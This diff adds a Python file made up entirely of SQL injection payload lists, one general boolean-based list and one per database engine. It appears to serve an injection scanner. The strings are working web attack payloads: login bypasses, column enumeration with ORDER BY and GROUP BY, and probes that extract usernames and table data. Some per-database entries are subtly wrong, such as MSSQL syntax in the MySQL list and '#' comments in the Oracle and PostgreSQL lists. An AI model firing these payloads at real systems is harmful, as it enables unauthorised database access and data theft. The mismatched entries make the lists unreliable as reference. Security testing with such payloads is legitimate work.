@@ -1,0 +1,90 @@
+BOOLEAN_PAYLOADS = [
+    "' OR '1'='1",
+    "' OR '1'='1' --",
+    "' OR '1'='1' #",
+    "' OR '1'='1'/*",
+    "' OR 1=1--",
+    "' OR 1=1#",
+    "' OR 1=1/*",
+    "') OR ('1'='1",
+    "') OR ('1'='1' --",
+    "') OR 1=1--",
+    "') OR 1=1#",
+    "') OR 1=1/*",
+    "') OR ('1'='1' #",
+    "OR 1=1--",
+    "OR 1=1#",
+    "OR 1=1/*",
+    "' OR 'a'='a",
+    "' OR 'a'='b",
+    "' OR 1=1 LIMIT 1--",
+    "admin' OR '1'='1",
+    "admin'--",
+    "admin' #",
+    "admin'/*",
+    "' or 1=1 limit 1 -- '",
+    "1' ORDER BY 1--",
+    "1' ORDER BY 2--",
+    "1' ORDER BY 3--",
+    "1' ORDER BY 4--",
+    "1' ORDER BY 5--",
+    "1' ORDER BY 6--",
+    "1' ORDER BY 7--",
+    "1' ORDER BY 8--",
+    "1' ORDER BY 9--",
+    "1' ORDER BY 10--",
+    "1' GROUP BY 1--",
+    "1' GROUP BY 1,2--",
+    "1' GROUP BY 1,2,3--",
+    "1' GROUP BY 1,2,3,4--",
+    "1' AND 1=1--",
+    "1' AND 1=2--",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "1' AND '1'='1",
+    "1' AND '1'='2",
+    "1 AND 1=1",
+    "1 AND 1=2",
+    "true OR 1=1",
+    "false OR 1=1",
+    "1' OR '1'='1' AND '1'='1",
+    "1 AND (SELECT COUNT(*) FROM users)>0",
+    "1 AND (SELECT COUNT(*) FROM admin)>0",
+    "1 AND (SELECT LENGTH(username) FROM users WHERE id=1)>0",
+    "IF(1=1, 1, 2)",
+    "CASE WHEN 1=1 THEN 1 ELSE 2 END",
+]
+
+BOOLEAN_PAYLOADS_MYSQL = [
+    "1' AND SLEEP(0)--",
+    "1' AND SLEEP(0)#",
+    "1' WAITFOR DELAY '00:00:00'--",
+    "1 AND (SELECT COUNT(*) FROM information_schema.tables)>0",
+]
+
+BOOLEAN_PAYLOADS_POSTGRESQL = [
+    "1' AND 1=1::int--",
+    "1' AND 1=1--",
+    "1' AND 1=1#",
+    "1'; SELECT CASE WHEN 1=1 THEN pg_sleep(0) ELSE pg_sleep(5) END--",
+]
+
+BOOLEAN_PAYLOADS_MSSQL = [
+    "1' AND 1=1--",
+    "1' AND 1=1#",
+    "1'; IF 1=1 WAITFOR DELAY '00:00:00'--",
+    "1' AND ASCII(LEFT((SELECT TOP 1 username FROM users),1))>0--",
+]
+
+BOOLEAN_PAYLOADS_ORACLE = [
+    "1' AND 1=1--",
+    "1' AND 1=1#",
+    "1' AND DBMS_PIPE.RECEIVE_MESSAGE('x',0)='x'--",
+    "1' AND (SELECT COUNT(*) FROM all_tables)>0--",
+]
+
+BOOLEAN_PAYLOADS_SQLITE = [
+    "1' AND 1=1--",
+    "1' AND 1=1#",
+    "1'; SELECT CASE WHEN 1=1 THEN 1 ELSE 0 END--",
+]
